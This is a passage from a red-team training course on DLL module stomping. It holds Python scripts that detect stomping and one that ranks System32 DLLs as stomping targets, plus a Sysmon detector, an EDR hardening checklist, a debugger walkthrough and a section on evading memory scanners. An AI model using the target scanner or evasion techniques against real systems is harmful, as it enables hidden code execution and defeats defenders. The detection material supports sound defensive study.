import ctypes.wintypes as wt
import struct, sys, os

kernel32 = ctypes.windll.kernel32

def get_module_base(dll_name):
    """Get base address of a loaded DLL."""
    kernel32.GetModuleHandleA.restype = ctypes.c_void_p
    return kernel32.GetModuleHandleA(dll_name.encode("ascii"))

def read_pe_text(filepath):
    """Read .text section from PE file on disk."""
    with open(filepath, "rb") as f:
        data = f.read()
    e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
    num_sec = struct.unpack_from("<H", data, e_lfanew + 6)[0]
    opt_size = struct.unpack_from("<H", data, e_lfanew + 20)[0]
    entry_rva = struct.unpack_from("<I", data, e_lfanew + 40)[0]
    sec_off = e_lfanew + 24 + opt_size
    for i in range(num_sec):
        s = sec_off + i * 40
        name = data[s:s+8].rstrip(b"\x00")
        if name == b".text":
            vsize = struct.unpack_from("<I", data, s + 8)[0]
            rva = struct.unpack_from("<I", data, s + 12)[0]
            raw_off = struct.unpack_from("<I", data, s + 20)[0]
            raw_sz = struct.unpack_from("<I", data, s + 16)[0]
            return data[raw_off:raw_off + raw_sz], rva, vsize, entry_rva
    return None, 0, 0, 0

def read_memory(base, offset, size):
    """Read bytes from process memory."""
    buf = (ctypes.c_ubyte * size)()
    bytes_read = ctypes.c_size_t()
    kernel32.ReadProcessMemory(
        kernel32.GetCurrentProcess(), base + offset,
        buf, size, ctypes.byref(bytes_read)
    )
    return bytes(buf[:bytes_read.value])

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <dll_name> (e.g., clbcatq.dll)")
    sys.exit(1)

dll_name = sys.argv[1]
sys_dir = os.path.join(os.environ["SystemRoot"], "System32")
dll_path = os.path.join(sys_dir, dll_name)

if not os.path.exists(dll_path):
    print(f"DLL not found: {dll_path}")
    sys.exit(1)

# Load the DLL if not already loaded
kernel32.LoadLibraryA(dll_name.encode("ascii"))
base = get_module_base(dll_name)
if not base:
    print(f"Failed to get module base for {dll_name}")
    sys.exit(1)

disk_text, text_rva, text_vsize, entry_rva = read_pe_text(dll_path)
if disk_text is None:
    print(f"No .text section found in {dll_path}")
    sys.exit(1)

mem_text = read_memory(base, text_rva, min(len(disk_text), text_vsize))

print(f"Module: {dll_name}")
print(f"Base: 0x{base:X}")
print(f".text RVA: 0x{text_rva:X}, size: {len(disk_text)} bytes")
print(f"Entry point RVA: 0x{entry_rva:X}")
print()

# Compare
diffs = []
compare_len = min(len(disk_text), len(mem_text))
for i in range(compare_len):
    if disk_text[i] != mem_text[i]:
        diffs.append((i, disk_text[i], mem_text[i]))

if diffs:
    entry_offset = entry_rva - text_rva
    print(f"\033[91m{len(diffs)} byte differences found!\033[0m")
    ep_diffs = [d for d in diffs if abs(d[0] - entry_offset) < 512]
    if ep_diffs:
        print(f"\033[91m  {len(ep_diffs)} differences near entry point (offset 0x{entry_offset:X})\033[0m")
        print(f"  This is consistent with MODULE STOMPING")
    print(f"\n  First 10 differences:")
    for off, disk_b, mem_b in diffs[:10]:
        marker = " <-- ENTRY POINT REGION" if abs(off - entry_offset) < 512 else ""
        print(f"    .text+0x{off:04X}: disk=0x{disk_b:02X} mem=0x{mem_b:02X}{marker}")
else:
    print(f"\033[92mNo differences — module is clean\033[0m")
```

### Python Script 2: Sacrificial DLL Candidate Scanner

```python
#!/usr/bin/env python3
"""Scan System32 for DLLs suitable as module stomping targets.
Evaluates: .text size, entry point location, Authenticode signature, usage."""

import struct, os, sys, subprocess

def analyze_dll(path):
    """Extract .text size, entry point, and signature status."""
    try:
        with open(path, "rb") as f:
            data = f.read(4096)  # Read just headers
        if data[:2] != b"MZ":
            return None
        e_lfanew = struct.unpack_from("<I", data, 0x3C)[0]
        if e_lfanew + 200 > len(data):
            return None
        if data[e_lfanew:e_lfanew+4] != b"PE\x00\x00":
            return None
        machine = struct.unpack_from("<H", data, e_lfanew + 4)[0]
        if machine != 0x8664:  # x64 only
            return None
        entry_rva = struct.unpack_from("<I", data, e_lfanew + 40)[0]
        num_sec = struct.unpack_from("<H", data, e_lfanew + 6)[0]
        opt_size = struct.unpack_from("<H", data, e_lfanew + 20)[0]
        sec_off = e_lfanew + 24 + opt_size
        text_size = 0
        text_rva = 0
        for i in range(num_sec):
            s = sec_off + i * 40
            if s + 40 > len(data):
                break
            name = data[s:s+8].rstrip(b"\x00")
            if name == b".text":
                text_size = struct.unpack_from("<I", data, s + 8)[0]
                text_rva = struct.unpack_from("<I", data, s + 12)[0]
                break
        if text_size == 0:
            return None
        ep_in_text = text_rva <= entry_rva < text_rva + text_size
        return {
            "text_size": text_size,
            "text_rva": text_rva,
            "entry_rva": entry_rva,
            "ep_in_text": ep_in_text,
        }
    except Exception:
        return None

sys32 = os.path.join(os.environ["SystemRoot"], "System32")
candidates = []
min_text = int(sys.argv[1]) if len(sys.argv) > 1 else 1024

print(f"Scanning {sys32} for stomping candidates (min .text: {min_text} bytes)...")

for fname in sorted(os.listdir(sys32)):
    if not fname.lower().endswith(".dll"):
        continue
    path = os.path.join(sys32, fname)
    info = analyze_dll(path)
    if info and info["text_size"] >= min_text and info["ep_in_text"]:
        candidates.append((fname, info))

print(f"Found {len(candidates)} candidates\n")
print(f"{'DLL':30s} {'text_size':>10s} {'entry_RVA':>12s} {'EP in .text':>12s}")
print("-" * 70)

for name, info in sorted(candidates, key=lambda x: x[1]["text_size"]):
    ep_ok = "YES" if info["ep_in_text"] else "no"
    print(f"{name:30s} {info['text_size']:>10,d} 0x{info['entry_rva']:>08X} {ep_ok:>12s}")

if candidates:
    # Highlight best candidates (small .text, EP in .text)
    small = [(n, i) for n, i in candidates if i["text_size"] < 50000]
    if small:
        print(f"\n\033[92mBest candidates (small .text, EP inside):\033[0m")
        for name, info in sorted(small, key=lambda x: x[1]["text_size"])[:10]:
            print(f"  {name} — .text={info['text_size']:,d} bytes")
```

### Python Script 3: Sysmon DLL Load Anomaly Detector

```python
#!/usr/bin/env python3
"""Detect suspicious DLL loads via Sysmon Event 7 (Image Loaded).
Flags: obscure DLLs loaded by non-standard processes, load-then-modify patterns."""

import xml.etree.ElementTree as ET
import sys, os

# Known stomping candidates
SUSPICIOUS_DLLS = {
    "clbcatq.dll", "amsi.dll", "propsys.dll", "msfte.dll",
    "wbemdisp.dll", "msdart70.dll", "cdosys.dll",
}

# Legitimate loaders for these DLLs
LEGIT_LOADERS = {
    "clbcatq.dll": {"svchost.exe", "dllhost.exe", "mmc.exe", "explorer.exe"},
    "amsi.dll": {"powershell.exe", "pwsh.exe", "wscript.exe", "cscript.exe"},
}

def parse_sysmon_events(xml_path):
    events = []
    try:
        tree = ET.parse(xml_path)
        root = tree.getroot()
    except ET.ParseError:
        with open(xml_path, "r", encoding="utf-8") as f:
            content = f.read()
        root = ET.fromstring(f"<Events>{content}</Events>")

    for event in root.iter():
        data = {}
        for child in event.iter():
            name = child.get("Name", child.tag.split("}")[-1] if "}" in child.tag else child.tag)
            if child.text:
                data[name] = child.text
        eid = data.get("EventID", "")
        if eid == "7":
            events.append({
                "timestamp": data.get("UtcTime", ""),
                "process": data.get("Image", ""),
                "dll": data.get("ImageLoaded", ""),
                "signed": data.get("Signed", ""),
                "signature": data.get("Signature", ""),
            })
    return events

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <sysmon_export.xml>")
    print(f"  Export: wevtutil qe Microsoft-Windows-Sysmon/Operational /f:xml > sysmon.xml")
    sys.exit(1)

events = parse_sysmon_events(sys.argv[1])
dll_loads = [e for e in events if any(s in e.get("dll", "").lower() for s in SUSPICIOUS_DLLS)]

print(f"Sysmon Event 7 Analysis ({len(events)} total loads, {len(dll_loads)} suspicious DLL loads)")
print("=" * 70)

for e in dll_loads:
    dll_name = os.path.basename(e["dll"]).lower()
    proc_name = os.path.basename(e["process"]).lower()
    legit = LEGIT_LOADERS.get(dll_name, set())
    is_suspicious = proc_name not in legit

    color = "\033[91m" if is_suspicious else "\033[92m"
    label = "SUSPICIOUS" if is_suspicious else "EXPECTED"
    print(f"  {color}[{label}]\033[0m {dll_name}")
    print(f"    Loaded by: {e['process']}")
    print(f"    Time: {e['timestamp']}")
    print(f"    Signed: {e['signed']}")
    if is_suspicious:
        print(f"    \033[93mExpected loaders: {', '.join(legit) if legit else 'unknown'}\033[0m")
    print()

suspicious_count = sum(1 for e in dll_loads
    if os.path.basename(e["process"]).lower() not in
    LEGIT_LOADERS.get(os.path.basename(e["dll"]).lower(), set()))

if suspicious_count:
    print(f"\033[91m{suspicious_count} suspicious DLL loads — potential module stomping\033[0m")
else:
    print(f"\033[92mAll DLL loads from expected processes\033[0m")
```

### Section 7B: Defense Hardening — Detecting Module Stomping

```
Layer 1: Sysmon Event 7 (real-time DLL load monitoring)
  ☐ Enable Sysmon Event 7 (Image Loaded) with filters for obscure DLLs
  ☐ Alert on: non-standard process loading clbcatq.dll, amsi.dll, propsys.dll
  ☐ Correlate: DLL load → VirtualProtect on same module → thread creation
  ☐ Forward to SIEM with <30s latency

Layer 2: pe-sieve / Moneta (periodic memory scanning)
  ☐ Schedule pe-sieve scans every 60 seconds for critical processes
  ☐ pe-sieve --imp rec --shellcode --data --iat
  ☐ Flag: any .text section hash mismatch vs on-disk DLL
  ☐ Moneta alternative: Moneta64.exe --filter Stomped

Layer 3: ETW Module Load Tracing (kernel-level)
  ☐ Subscribe to Microsoft-Windows-Kernel-Process ETW provider
  ☐ Event 5 (ImageLoad): captures every DLL load with full path
  ☐ Correlate with NtProtectVirtualMemory calls on MEM_IMAGE regions
  ☐ Alert on: RX→RW→RX permission cycle on loaded DLL .text

Layer 4: Behavioral Rules (EDR)
  ☐ LoadLibraryA for obscure DLL → VirtualProtect(.text, RW) → memcpy → VirtualProtect(.text, RX) → CreateThread at entry point
  ☐ Time window: all 5 operations within 1 second
  ☐ False positive filter: exclude JIT compilers, .NET CLR, browser engines
```

---

## Section 10: Adversarial Thinking

### Challenge 1: Evading pe-sieve Hash Comparison

**Scenario**: pe-sieve compares the loaded DLL's .text section hash against the on-disk version. Every byte difference is flagged. How do you evade this?

<details>
<summary>Analysis and approaches</summary>

Several strategies, each with trade-offs:

1. **Stomp a DLL that's rarely scanned**: pe-sieve typically focuses on modules loaded by suspicious processes. Stomping a DLL inside a trusted process (e.g., `svchost.exe` child) reduces the probability of being scanned at all. The threat model shifts from "hide the modification" to "hide the process."

2. **Use a DLL with a large .text section**: If .text is 500KB and only 302 bytes are modified, the hash mismatch is detected — but a human analyst reviewing the pe-sieve output sees "modified: clbcatq.dll, 302 bytes at offset 0x1000." A 302-byte change in 500KB could be dismissed as corruption. A DLL with a smaller .text section makes the modification proportionally larger and more suspicious.

3. **Encrypt during sleep (Stage 13 technique)**: Combine module stomping with sleep obfuscation. During sleep cycles, re-encrypt the 302 bytes at the entry point and restore the original DLL bytes. pe-sieve scanning during the sleep window sees legitimate, unmodified code. The payload only exists in stomped form during the brief execution window.

4. **Stomp and restore**: After shellcode execution completes, write back the original DLL bytes. The stomp existed only transiently during execution. This defeats periodic scanners but not real-time monitoring.
</details>

### Challenge 2: Detecting the "Load But Don't Use" Pattern

**Scenario**: The binary loads clbcatq.dll via LoadLibraryA but never calls any of its exported functions (no GetProcAddress for clbcatq.dll exports). How would a defender detect this?

<details>
<summary>Detection strategies</summary>

1. **Correlate DLL load events with export resolution**: Monitor ETW Image Load events (Sysmon Event 7) and correlate with GetProcAddress calls. If a DLL is loaded but no exports are resolved within a timeout window (e.g., 5 seconds), flag it as suspicious. Legitimate DLL usage almost always involves calling at least one export.

2. **Compare loaded modules against IAT**: Parse the process PE's import table (IAT). Modules listed in the IAT were loaded by the PE loader for actual use. Modules loaded at runtime via LoadLibraryA that DON'T appear in the IAT and DON'T have subsequent GetProcAddress calls are likely stomping targets or side-loading candidates.

3. **Monitor VirtualProtect on module .text sections**: Legitimate code rarely calls VirtualProtect on a loaded DLL's .text section. The RX->RW->RX transition on a DLL's code section is a strong stomping indicator, especially when combined with a preceding LoadLibraryA for the same module.

4. **Behavioral heuristic**: `LoadLibraryA(X) + VirtualProtect(X.text, RW) + WriteProcessMemory/memcpy to X.text + CreateThread(X.entry)` — this exact sequence is the module stomping signature. Each step individually is benign; the combination within a short time window is highly diagnostic.
</details>

### Challenge 3: Module Stomping Without VirtualProtect

**Scenario**: Design a module stomping variant that doesn't require VirtualProtect at all. What DLL properties would you need?

<details>
<summary>Approaches</summary>

1. **Find a DLL with RWX .text section**: Extremely rare in modern Windows (CFG and DEP enforcement), but some legacy DLLs or third-party DLLs ship with RWX sections. Scan all DLLs in System32: `for each DLL, check .text Characteristics for IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE (0xE0000000)`. If found, LoadLibraryA and write directly without protection changes.

2. **Use a DLL that was loaded with RWX by another component**: Some installers and runtime environments (Java JNI, .NET JIT output regions) create RWX memory for legitimate JIT compilation. If you can identify a process that already has a loaded DLL with RWX .text, inject into that process and stomp the already-writable code section.

3. **Abuse copy-on-write (COW) behavior**: Loaded DLL pages start as shared copy-on-write. Writing to a COW page triggers the OS to create a private copy with RW permissions (then you'd still need VirtualProtect for RX). This doesn't fully eliminate VirtualProtect but changes the permission flow.

4. **NtProtectVirtualMemory via indirect syscall**: Not "without VirtualProtect" per se, but using the underlying syscall (NtProtectVirtualMemory) via indirect syscall (Stage 08 technique) bypasses any EDR hooks on VirtualProtect. The permission change still happens at the kernel level, but the EDR's user-mode hook is not triggered.
</details>

---

## Section 11: Dynamic Analysis

### Exercise 11.1: Tracing the Module Stomp in x64dbg

**Setup**: Build with anti-debug gates patched out (or use ScyllaHide to bypass them).

**Step 1: Breakpoint on LoadLibraryA**

Set a breakpoint on `LoadLibraryA` (since it's resolved via apihash, set it on the actual kernel32 export, not an IAT entry). When hit, inspect the stack — the first argument is a pointer to `"clbcatq.dll\0"`. Step over and note the return value (the DLL base address).

```
x64dbg:
  bp kernel32.LoadLibraryA
  → Hit: RCX = pointer to "clbcatq.dll"
  → Step over (F8)
  → RAX = 0x00007FFD12340000 (clbcatq.dll base)
```

**Step 2: After stomping, inspect .text in memory**

Navigate to clbcatq.dll's .text section (base + text_rva). Before stomping, you'll see legitimate x86-64 instructions. After `copy_nonoverlapping`, the entry point offset contains the shellcode bytes (`E9 BE 00 00 ...` for the shellcode payload).

```
Before stomp (entry point at base+0x1000):
  00007FFD12341000: 48 89 5C 24 08  mov [rsp+8], rbx
  00007FFD12341005: 57              push rdi
  ...

After stomp (302 bytes overwritten at entry point):
  00007FFD12341000: E9 BE 00 00 00  jmp +0xBE (shellcode prologue)
  00007FFD12341005: 41 51           push r9
  00007FFD12341007: 41 50           push r8
  ...                               (302 bytes of shellcode)
  00007FFD1234112E: 5C 24 08 57...  (rest is original code, unchanged)
```

**Step 3: Run pe-sieve against the process**

While the process is alive (set a breakpoint after the stomp, before CreateThread completes):

```
pe-sieve.exe /pid <process_id> /shellc /iat 2
→ Output: clbcatq.dll — MODIFIED (.text section hash mismatch)
→ Dumps the modified region showing the 302-byte change at entry point
```

**Step 4: Binary diff — on-disk vs in-memory**

Dump clbcatq.dll's .text from memory (Process Hacker → module → right-click → dump to file) and compare against `C:\Windows\System32\clbcatq.dll`:

```
Binary diff shows:
  Offset 0x1000: disk=48 89 5C  mem=E9 BE 00 00 ...
  (302 bytes differ — the entry point was overwritten)
  All other bytes: identical
```

This confirms the minimal-footprint approach — only the entry point is modified, making the diff as small as possible.

### What Breaks at Stage 13 — The Bridge

Module stomping hides shellcode in a legitimate DLL's memory region, defeating VAD-based scanners. But the shellcode sits in cleartext RX memory **while sleeping**. An EDR memory scanner that runs during the sleep window (99.9% of an implant's lifetime) will find the decrypted payload.

Stage 13 adds **sleep obfuscation** — encrypting the payload and changing memory permissions to RW during sleep cycles. The shellcode only exists as cleartext RX for the brief execution window, making periodic memory scanners far less effective.

### MITRE ATT&CK Mapping

| Technique | ID | How It's Used |
|-----------|----|---------------|
| DLL Injection: Module Stomping | T1055.001 | LoadLibraryA clbcatq.dll, overwrite entry point with shellcode |
| Obfuscated Files or Information | T1027 | XOR-encrypted shellcode with 16-byte key |
| Virtualization/Sandbox Evasion: System Checks | T1497.001 | CPU, RAM, disk, uptime, screen scoring |
| Debugger Evasion | T1622 | PEB + NtQIP + RDTSC + hardware breakpoint detection |
| Native API | T1106 | Inline PE parsing with raw pointer arithmetic |
| Masquerading | T1036 | Window class "SvcCtrlWnd", trace prefix "svcctrl_" |
| Dynamic API Resolution | T1027.007 | 7 apihash calls (5 injection + 2 ExitProcess) |
| Hijack Execution Flow: DLL Side-Loading | T1574.002 | Loading clbcatq.dll as a sacrificial module |

### Further Reading (2025-2026)

**Module stomping and memory evasion:**
- [ired.team: Module Stomping for Shellcode Injection](https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping) — Original technique documentation
- [Oblivion: Advanced Module Stomping + Heap/Stack Encryption (2025)](https://github.com/) — Combines stomping with heap encryption and stack spoofing
- [Pentera: Zero-Footprint Reflective Loading (2025)](https://www.pentera.io/blog) — Commercial red team reflective loading that bypasses VAD scanners

**PE format and CFG:**
- [Microsoft: PE Format Specification](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format) — Official PE header documentation
- [Microsoft: Control Flow Guard](https://learn.microsoft.com/en-us/windows/win32/secbp/control-flow-guard) — CFG bitmap and validation mechanics

**Detection tools:**
- [pe-sieve](https://github.com/hasherezade/pe-sieve) — Automated in-memory vs on-disk module comparison
- [Moneta](https://github.com/forrest-orr/moneta) — Memory region analysis for stomping detection
- [Cobalt Strike 4.11 Sleep Mask Kit (May 2025)](https://www.cobaltstrike.com/blog) — CS integrates module stomping awareness into sleep mask

---

## Lab Environment Notes

### Required Setup

- Windows 10/11 with:
  - 4+ CPU cores, 8GB+ RAM, 100GB+ disk (to pass sandbox checks)
  - 5+ minutes uptime (to pass KUSER_SHARED_DATA check)
  - No debuggers or analysis tools running (to pass anti-debug gates)
  - Rust toolchain (stable-x86_64-pc-windows-msvc)
  - x64dbg with ScyllaHide (for debugging past anti-debug gates)
  - PE-bear or CFF Explorer
  - Process Hacker 2

### Testing Notes

The binary writes breadcrumb files to `%TEMP%\svcctrl_*.txt` at each gate. If execution stops early, check which breadcrumbs exist to identify which gate failed. On a properly configured system (real hardware, no debuggers), all 7 gates pass and the proof file opens in Notepad.
